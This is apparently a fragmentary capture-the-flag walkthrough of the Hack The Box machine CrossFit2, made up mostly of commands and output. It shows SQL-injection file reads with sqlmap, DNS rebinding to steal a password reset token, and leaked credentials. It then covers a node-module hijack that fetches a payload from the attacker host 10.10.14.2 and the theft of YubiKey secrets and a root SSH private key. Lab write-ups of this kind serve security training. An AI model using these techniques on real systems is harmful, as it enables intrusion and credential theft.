487831464633784977770A723336434B76426D54315558505A6B384A426944757245723863766A5A735166634B713167625250736944514B585561536E70316B6E2B68306A2B6E456259450A517335306E4F6A624C574C717758433453653966786870494A52457354324B4639725065556A7670395353634C6B4134336E477458636767564A30496B4733570A37694C5030654C634D356B7754554139774A4572624C523831736B6A746F50644D6E496B4F734833317A34513737355843392B746F674275316965377535316F0A4B337A64727033534E6B70626D775A6C4D56784F714F5848566D2B565374636975704E383561714F54574273782B6B49463237776A3874693262315A7752334B0A3538713654445751706A337035313030334930734D582F742F5443636E5A6562496E75565363794C6D5034455145644C67356B5330793349654C456344387A2F0A324F6A734B5871383247466231322B4937664546636234505474762B6A4732706B712B616A773D3D0A2D2D2D2D2D454E442043455254494649434154452D2D2D2D2D0A
----
----
$ sqlmap -u http://localhost:6969/?id=1 --file-read=/var/unbound/etc/tls/unbound_server.pem

[INFO] fetching file: '/var/unbound/etc/tls/unbound_server.pem'
[INFO] resumed: 2D2D2D2D2D424547494E2043455254494649434154452D2D2D2D2D0A4D4949446F4443434167674343514478335A4A2B4651644E6E6A414E42676B71686B69473977304241517346414441534D5241774467594456515144444164310A626D4A766457356B4D423458445449784D4445784D5441334D4445784D466F58445451774D446B794F4441334D4445784D466F77456A45514D413447413155450A4177774864573569623356755A444343416149774451594A4B6F5A496876634E4151454242514144676747504144434341596F4367674742414C615374684B760A312F4C586A55666179494C304B33546850337673312B507061504B5069526B6A3756594B4C3351336C76486243457A6D6A7746787A725966796B624A6E72646D0A3770675056476C5762726132696653664E6F6B5663432F73626C756237475876554B5557624B354A61767237764938456C6A766E397132387A6539465A7A36570A315A6F6A47585355394D314B55356B736C4E546E463473544C63765539554A475733374B762F6847716C4E384D594655434D356A4F6B65393472657755756F540A39787734637665446E4D6348776A426C6253514C36523265374751576C552F7662316E744471316E464533427537744B2B4A44334E69395274376A5466722F750A657A5A507545672F367A31694B746E6D584E4F43775A47485335674F6447525161663455536E6A597937446153567758734F5155705A36745770746F6C7970390A42725A4D335131554847304F5A59434E6F303469386B4C353061397056676773375130547653714F324B67594D526A3738764E7A6F7450452B384651706A392B0A37676C563132425153756835336C4E5333325770775453317959667677327358742F6D2B4257355473366D7573476A3041414E576436425A416D3733357158510A6E743731394E7A465173597630666346416D626D6758563158325A68775A76784A5747447073794C6C4E514B6A6854575862344A333268497A774944415141420A4D41304743537147534962334451454243775541413449426751436D487577376F6C3350664A7869646D6A446B714A74412B51344F4F7167664848416F7133330A70516532436251456B3530415A4D64657A78584E304937546F4F6B456B5845533642694B446E3746416C4F6D456C434176595A68566B71374F776748534543720A747677696170356578523957316346786F6A7A3775665757706B2B32463352524A6875646D61434D6C66354B49464D4B3442714E743161486A734D37727368500A6A4A334173454C435367704F564375632B4A6E712B34497A624E4E7135356F4D5671366B354554736934546746657733674A664D45696246357A566273584D4B0A412B63707968524E2B585844306D61532B433242433261356B4762386A70356F7450584452734A674A5772506235697247575939696E3777385A644F4D5736760A466353614C6E7A396251377139332B646268504652626A7A2B515761687651797739316D7577506D6B4C4342374F4C57656468613574667557316534574E6A740A5043414D62735367544873506772726D30496F4B384166784A687439774531446D3458666D585347674855365137757373636F5630647834376D2B766D46595A0A5A3166614D31366C4271664944444F486D32336249506B4F303842483456614F374859586C585159315247525948394E4A6C6B52362B6C6764754B39446B4E4D0A53654A49506B6951716C33664832747278785A356934503233426B3D0A2D2D2D2D2D454E442043455254494649434154452D2D2D2D2D0A
----

----
$ sqlmap -u http://localhost:6969/?id=1 --file-read=/var/unbound/db/root.key

[INFO] fetching file: '/var/unbound/db/root.key'
[INFO] resumed: 3B206175746F747275737420747275737420616E63686F722066696C650A3B3B69643A202E20310A3B3B6C6173745F717565726965643A2031363136343033383531203B3B4D6F6E204D61722032322030393A30343A313120323032310A3B3B6C6173745F737563636573733A2031363136343033383531203B3B4D6F6E204D61722032322030393A30343A313120323032310A3B3B6E6578745F70726F62655F74696D653A2031363136343435343439203B3B4D6F6E204D61722032322032303A33373A323920323032310A3B3B71756572795F6661696C65643A20300A3B3B71756572795F696E74657276616C3A2034333230300A3B3B72657472795F74696D653A20383634300A2E09383634303009494E09444E534B45590932353720332038204177454141617A2F74416D3879546E344D6665683565794939365753566578544241766B4D674A7A6B4B544F695731766B49627A786546332B2F345267574F7137487278526978486C466C45784F4C414A7235656D4C764E37535758676E4C68342B423578516C4E567A384F67386B7641724D744E524F785651754361536E49446444354C4B7957625264326E39574765325238507A67436D72334567564C726A79427857657A46306A4C4877564E386566533372436A2F455767764957676239746172705655444B2F62353844612B7371716C7333654E6275763770722B656F5A472B5372444B366E57654C33633648354170787A374C6A5663317554496473495878754F4C5941342F696C426D5356497A754457666452556668486459362B636E384846526D2B32684D38416E5847587773393535354B72554235716968796C47613873756258324E6E3655774E5231416B555456373462553D203B7B6964203D20323033323620286B736B292C2073697A65203D2032303438627D203B3B73746174653D32205B202056414C494420205D203B3B636F756E743D30203B3B6C6173746368616E67653D31363130333437323831203B3B4D6F6E204A616E2031312030363A34313A323120323032310A
----
----
$ sqlmap -u http://localhost:6969/?id=1 --batch --file-read=/etc/httpd.conf

[INFO] fetching file: '/etc/httpd.conf'
[INFO] retrieved: 2320244F70656E4253443A2068747470642E636F6E662C7620312E323020323031382F30362F31332031353A30383A3234207265796B2045787020240A0A0A7479706573207B0A20202020696E636C75646520222F7573722F73686172652F6D6973632F6D696D652E7479706573220A7D0A0A7365727665722022302E302E302E3022207B0A096E6F206C6F670A096C697374656E206F6E206C6F3020706F727420383030300A0A2020202020202020726F6F7420222F6874646F6373220A20202020202020206469726563746F727920696E64657820696E6465782E7068700A0A096C6F636174696F6E20222A2E7068702A22207B0A09096661737463676920736F636B657420222F72756E2F7068702D66706D2E736F636B220A097D0A7D0A0A7365727665722022656D706C6F7965657322207B0A096E6F206C6F670A096C697374656E206F6E206C6F3020706F727420383030310A0A2020202020202020726F6F7420222F6874646F63735F656D706C6F79656573220A20202020202020206469726563746F727920696E64657820696E6465782E7068700A0A096C6F636174696F6E20222A2E7068702A22207B0A09096661737463676920736F636B657420222F72756E2F7068702D66706D2E736F636B220A097D0A7D0A0A73657276657220226368617422207B0A096E6F206C6F670A096C697374656E206F6E206C6F3020706F727420383030320A0A2020202020202020726F6F7420222F6874646F63735F63686174220A20202020202020206469726563746F727920696E64657820696E6465782E68746D6C0A0A096C6F636174696F6E206D6174636820225E2F686F6D652422207B0A092020202072657175657374207265777269746520222F696E6465782E68746D6C220A097D0A096C6F636174696F6E206D6174636820225E2F6C6F67696E2422207B0A092020202072657175657374207265777269746520222F696E6465782E68746D6C220A097D0A096C6F636174696F6E206D6174636820225E2F636861742422207B0A092020202072657175657374207265777269746520222F696E6465782E68746D6C220A097D0A096C6F636174696F6E206D6174636820225E2F66617669636F6E2E69636F2422207B0A092020202072657175657374207265777269746520222F696D616765732F63726F73732E706E67220A097D0A7D0A
----
----
$ sqlmap -u http://localhost:6969/?id=1 --batch --file-read=/etc/relayd.conf --fresh-queries

[INFO] fetching file: '/etc/relayd.conf'
[INFO] resumed: 7461626C653C313E7B3132372E302E302E317D0A7461626C653C323E7B3132372E302E302E317D0A7461626C653C333E7B3132372E302E302E317D0A7461626C653C343E7B3132372E302E302E317D0A687474702070726F746F636F6C207765627B0A0970617373207265717565737420717569636B206865616465722022486F7374222076616C756520222A63726F73736669742D636C75622E6874622220666F727761726420746F203C333E0A0970617373207265717565737420717569636B206865616465722022486F7374222076616C756520222A656D706C6F796565732E63726F73736669742E6874622220666F727761726420746F203C323E0A096D617463682072657175657374207061746820222F2A2220666F727761726420746F203C313E0A096D617463682072657175657374207061746820222F77732A2220666F727761726420746F203C343E0A096874747020776562736F636B6574730A7D0A0A7461626C653C353E7B3132372E302E302E317D0A7461626C653C363E7B3132372E302E302E31203132372E302E302E32203132372E302E302E33203132372E302E302E347D0A687474702070726F746F636F6C20706F7274616C7B0A0970617373207265717565737420717569636B207061746820222F2220666F727761726420746F203C353E0A0970617373207265717565737420717569636B207061746820222F696E6465782E68746D6C2220666F727761726420746F203C353E0A0970617373207265717565737420717569636B207061746820222F686F6D652220666F727761726420746F203C353E0A0970617373207265717565737420717569636B207061746820222F6C6F67696E2220666F727761726420746F203C353E0A0970617373207265717565737420717569636B207061746820222F636861742220666F727761726420746F203C353E0A0970617373207265717565737420717569636B207061746820222F6A732F2A2220666F727761726420746F203C353E0A0970617373207265717565737420717569636B207061746820222F6373732F2A2220666F727761726420746F203C353E0A0970617373207265717565737420717569636B207061746820222F666F6E74732F2A2220666F727761726420746F203C353E0A0970617373207265717565737420717569636B207061746820222F696D616765732F2A2220666F727761726420746F203C353E0A0970617373207265717565737420717569636B207061746820222F66617669636F6E2E69636F2220666F727761726420746F203C353E0A097061737320666F727761726420746F203C363E0A096874747020776562736F636B6574730A7D0A0A72656C6179207765627B0A096C697374656E206F6E2022302E302E302E302220706F72742038300A0970726F746F636F6C207765620A09666F727761726420746F203C313E20706F727420383030300A09666F727761726420746F203C323E20706F727420383030310A09666F727761726420746F203C333E20706F727420393939390A09666F727761726420746F203C343E20706F727420343431390A7D0A0A72656C617920706F7274616C7B0A096C697374656E206F6E203132372E302E302E3120706F727420393939390A0970726F746F636F6C20706F7274616C0A09666F727761726420746F203C353E20706F727420383030320A09666F727761726420746F203C363E20706F72742035303030206D6F646520736F757263652D686173680A7D0A
----
----
$ curl --silent http://crossfit-club.htb/login | tidy 2>/dev/null | grep "<script" | sed -E 's/.*<script src="(.*)".*/\1/g'

/js/chunk-vendors~a2e3b7a8.add5cb47.js
/js/chunk-vendors~ae3da056.9d253641.js
/js/chunk-vendors~2a42e354.b6526da4.js
/js/chunk-vendors~7274e1de.6b9d4dce.js
/js/chunk-vendors~7d359b94.c5efd8b4.js
/js/chunk-vendors~69ddfae0.eec560ca.js
#/js/chunk-vendors~f9ca8911.8262afb1.js#
/js/chunk-vendors~1c3a2c3f.e0a80b78.js
/js/chunk-vendors~cfbf0a2e.c57c68ae.js
/js/chunk-vendors~fdc6512a.317a5502.js
/js/chunk-vendors~6ff199a4.cd7a889d.js
/js/chunk-vendors~b06fff24.dad67692.js
/js/chunk-vendors~456318af.4cb6d30a.js
/js/chunk-vendors~b1f96ece.03d078ca.js
/js/chunk-vendors~d2305125.72dc1ecf.js
/js/chunk-vendors~4a7e9e0b.33fdc63f.js
/js/chunk-vendors~03631906.67e21e66.js
/js/chunk-vendors~b70f2fe9.15b78819.js
/js/app~748942c6.ead68abe.js
----

----
GET /password-reset.php?token=de36890d686f174f6b6b8583c3463f2e753e7edcb83fb862fde353c908dcbd451d930ca2c9859a29809127181a41860f60ff0097cfdb6f002b55b2bb835439aa HTTP/1.1
Host: ggemployees.crossfit.htb
User-Agent: Mozilla/5.0 (X11; OpenBSD amd64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://crossfit-club.htb/
Upgrade-Insecure-Requests: 1
----
----
            function d(e, t) {
                if (!(this instanceof d)) return new d(e, t);
                e && "object" === typeof e && (t = e, e = void 0), t = t || {}, t.path = t.path || "/socket.io", this.nsps = {}, this.subs = [], this.opts = t, this.reconnection(!1 !== t.reconnection), this.reconnectionAttempts(t.reconnectionAttempts || Infinity), this.reconnectionDelay(t.reconnectionDelay || 1e3), this.reconnectionDelayMax(t.reconnectionDelayMax || 5e3), this.randomizationFactor(t.randomizationFactor || .5), this.backoff = new f({
                    min: this.reconnectionDelay(),
                    max: this.reconnectionDelayMax(),
                    jitter: this.randomizationFactor()
                }), this.timeout(null == t.timeout ? 2e4 : t.timeout), this.readyState = "closed", this.uri = e, this.connecting = [], this.lastPing = null, this.encoding = true, this.packetBuffer = [];
                var n = t.parser || s;
                this.encoder = new n.Encoder, this.decoder = new n.Decoder, this.autoConnect = !1 !== t.autoConnect, this.autoConnect && this.open()
            }
----
----
[+] DNS Rebinding
[-] forwarding fake-employees.crossfit.htb: ok
[+] Running DNS Proxy for localhost
[-] (15:51:26) [*] Cooking A replies to point to 127.0.0.1 matching: fake-employees.crossfit.htb
[+] Sending password reset request
[1] (15:51:30) [*] 10.10.10.232: cooking the response of type 'A' for fake-employees.crossfit.htb to 127.0.0.1
[2] (15:51:31) [*] 10.10.10.232: cooking the response of type 'A' for fake-employees.crossfit.htb to 127.0.0.1
[+] Running DNS Proxy for 10.10.14.2
[-] (15:51:32) [*] Cooking A replies to point to 10.10.14.2 matching: fake-employees.crossfit.htb
[-] (15:51:32) [*] Cooking A replies to point to 10.10.14.2 matching: crossfit-club.htb
[1] (15:52:23) [*] 10.10.10.232: cooking the response of type 'A' for fake-employees.crossfit.htb to 10.10.14.2


[Fri Apr 23 15:50:16 2021] PHP 7.4.15 Development Server (http://0.0.0.0:80) started
[Fri Apr 23 15:52:24 2021] 10.10.10.232:37148 Accepted
[Fri Apr 23 15:52:24 2021] 10.10.10.232:37148 [200]: GET /password-reset.php?token=f9ce207bc5c2ae41999f57bdd8ecb09d001fb393455ab7484e5e24884b7e4f4be9c33ef78b4b9cbfe17b67c1900e45047a45058eb8fa6010e7259d3eb10edf2c
[Fri Apr 23 15:52:24 2021] 10.10.10.232:37148 Closing
[Fri Apr 23 15:52:25 2021] 10.10.10.232:19003 Accepted
[Fri Apr 23 15:52:25 2021] 10.10.10.232:19003 [404]: GET /favicon.ico - No such file or directory
[Fri Apr 23 15:52:25 2021] 10.10.10.232:19003 Closing
[Fri Apr 23 15:52:26 2021] 10.10.10.232:6747 Accepted
[Fri Apr 23 15:52:26 2021] 10.10.10.232:6747 [404]: GET /?x={%22sender_id%22:2,%22content%22:%22Hello%20David,%20I%27ve%20added%20a%20user%20account%20for%20you%20with%20the%20password%20`NWBFcSe3ws4VDhTB`.%22,%22roomId%22:2,%22_id%22:25} - No such file or directory
[Fri Apr 23 15:52:26 2021] 10.10.10.232:6747 Closing



{"sender_id":2,"content":"Hello David, I've added a user account for you with the password `NWBFcSe3ws4VDhTB`.","roomId":2,"_id":1102}

sshpass -p NWBFcSe3ws4VDhTB ssh -l david 10.10.10.232
----
----
crossfit2$ cat /etc/passwd | grep -E "sh$"

  root:*:0:0:Charlie &:/root:/bin/ksh
  build:*:21:21:base and xenocara build:/var/empty:/bin/ksh
  lucille:*:1002:1002:,,,:/home/lucille:/bin/csh
  node:*:1003:1003::/home/node:/bin/ksh
  david:*:1004:1004:,,,:/home/david:/bin/csh
  john:*:1005:1005::/home/john:/bin/csh

crossfit2$ id

  uid=1004(david) gid=1004(david) groups=1004(david), 1003(sysadmins)

crossfit2$ cat /etc/group | grep sysadmin

  sysadmins:*:1003:david,john

crossfit2$ find / -group sysadmins -ls 2>/dev/null

  1244170    4 drwxrwxr-x    3 root     sysadmins      512 Feb  3 04:45 /opt/sysadmin

crossfit2$ find / -user root -perm -4000 -type f -ls 2>/dev/null

  1425624   52 -r-sr-xr-x    3 root     bin         26552 Oct  5  2020 /usr/bin/chfn
  1425624   52 -r-sr-xr-x    3 root     bin         26552 Oct  5  2020 /usr/bin/chpass
  1425624   52 -r-sr-xr-x    3 root     bin         26552 Oct  5  2020 /usr/bin/chsh
  1425650   56 -r-sr-xr-x    1 root     bin         27464 Oct  5  2020 /usr/bin/doas
  1425715   60 -r-sr-sr-x    1 root     daemon      29936 Oct  5  2020 /usr/bin/lpr
  1425716   52 -r-sr-sr-x    1 root     daemon      24880 Oct  5  2020 /usr/bin/lprm
  1425743   44 -r-sr-xr-x    1 root     bin         20936 Oct  5  2020 /usr/bin/passwd
  1425809   36 -r-sr-xr-x    1 root     bin         17216 Oct  5  2020 /usr/bin/su
  1478072   20 -r-sr-xr-x    1 root     bin          8880 Oct  5  2020 /usr/libexec/lockspool
  1478095  960 -r-sr-xr-x    1 root     bin        466608 Oct  5  2020 /usr/libexec/ssh-keysign
  1481580   20 -rwsr-s---    1 root     staff        9024 Jan  5 13:04 /usr/local/bin/log
  1503426   48 -r-sr-sr-x    2 root     authpf      23000 Oct  5  2020 /usr/sbin/authpf
  1503426   48 -r-sr-sr-x    2 root     authpf      23000 Oct  5  2020 /usr/sbin/authpf-noip
  1503506  288 -r-sr-x---    1 root     network    146208 Oct  5  2020 /usr/sbin/pppd
  1503559   64 -r-sr-xr-x    2 root     bin         32712 Oct  5  2020 /usr/sbin/traceroute
  1503559   64 -r-sr-xr-x    2 root     bin         32712 Oct  5  2020 /usr/sbin/traceroute6
  362927   736 -r-sr-xr-x    2 root     bin        356768 Oct  5  2020 /sbin/ping
  362927   736 -r-sr-xr-x    2 root     bin        356768 Oct  5  2020 /sbin/ping6
  362934   576 -r-sr-x---    1 root     operator   275928 Oct  5  2020 /sbin/shutdown

crossfit2$ cat /etc/group | grep staff

  staff:*:20:root,john

crossfit2$ cat statbot.js

const WebSocket = require('ws');
const fs = require('fs');
const logger = require('log-to-file');
const ws = new WebSocket("ws://gym.crossfit.htb/ws/");
function log(status, connect) {
  var message;
  if(status) {
    message = `Bot is alive`;
  }
  else {
    if(connect) {
      message = `Bot is down (failed to connect)`;
    }
    else {
      message = `Bot is down (failed to receive)`;
    }
  }
  logger(message, '/tmp/chatbot.log');
}
ws.on('error', function err() {
  ws.close();
  log(false, true);
})
ws.on('message', function message(data) {
  data = JSON.parse(data);
  try {
    if(data.status === "200") {
      ws.close()
      log(true, false);
    }
  }
  catch(err) {
      ws.close()
      log(false, false);
  }
});

crossfit2$ find / -name log-to-file 2>/dev/null

  /usr/local/lib/node_modules/log-to-file

crossfit2$ mkdir /opt/sysadmin/node_modules
crossfit2$ cp -r /usr/local/lib/node_modules/log-to-file /opt/sysadmin/node_modules
crossfit2$ curl -s --output /opt/sysadmin/node_modules/log-to-file/app.js http://10.10.14.2/app.js

mkdir /opt/sysadmin/node_modules
cp -r /usr/local/lib/node_modules/log-to-file /opt/sysadmin/node_modules
curl -s --output /opt/sysadmin/node_modules/log-to-file/app.js http://10.10.14.2/app.js
cat /opt/sysadmin/node_modules/log-to-file/app.js

$ cat /etc/login.conf

  daemon:\
	:ignorenologin:\
	:datasize=infinity:\
	:maxproc=infinity:\
	:openfiles-max=102400:\
	:openfiles-cur=102400:\
	:stacksize-cur=8M:\
	:auth-ssh=yubikey:\
	:auth-su=reject:\
	:tc=default:

$ id

  uid=1005(john) gid=1005(john) groups=1005(john), 20(staff), 1003(sysadmins)

$ /usr/local/bin/log

  * LogReader v0.1

  [*] Usage: /usr/local/bin/log <log file to read>

$ /usr/local/bin/log /var/db/yubikey/root.ctr

  * LogReader v0.1

  [*] Log size: 6

  985089
  
$ /usr/local/bin/log /var/db/yubikey/root.key

  * LogReader v0.1

  [*] Log size: 33

  6bf9a26475388ce998988b67eaa2ea87

$ /usr/local/bin/log /var/db/yubikey/root.uid

  * LogReader v0.1

  [*] Log size: 13

  a4ce1128bde4

/usr/local/bin/log /var/backups/root_.ssh_id_rsa.current

* LogReader v0.1

[*] Log size: 2610

-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
----

----
$ wget https://developers.yubico.com/yubico-c/Releases/libyubikey-1.13.tar.gz
$ gzip -d 
$ tar xvf 
$ cd 
$ ./configure
$ make check
$ sudo make install
$ ./ykgenerate 6bf9a26475388ce998988b67eaa2ea87 a4ce1128bde4 $(printf "%x" 985089 | cut -c1-4) c0a8 00 10
----
---
---
- https://websockets.readthedocs.io/en/3.0/intro.html
- https://www.neuralegion.com/blog/websocket-security-top-vulnerabilities/
- https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html
- https://gist.githubusercontent.com/MatthewVance/5051bf45cfed6e4a2a2ed9bb014bcd72/raw/2a2a1ce10e911e809a53cc815ef24c574e10efa5/unbound.conf
- https://blog.compass-security.com/2021/02/the-good-old-dns-rebinding/
- https://iphelix.medium.com/tools-release-dnschef-3b7189a93b83
- https://shellgenerator.github.io/?IPInput=10.10.14.2&PortInput=6969
- https://www.straybits.org/post/2014/openbsd-yubikey/
- https://github.com/Yubico/yubico-c
- https://man.openbsd.org/changelist.5

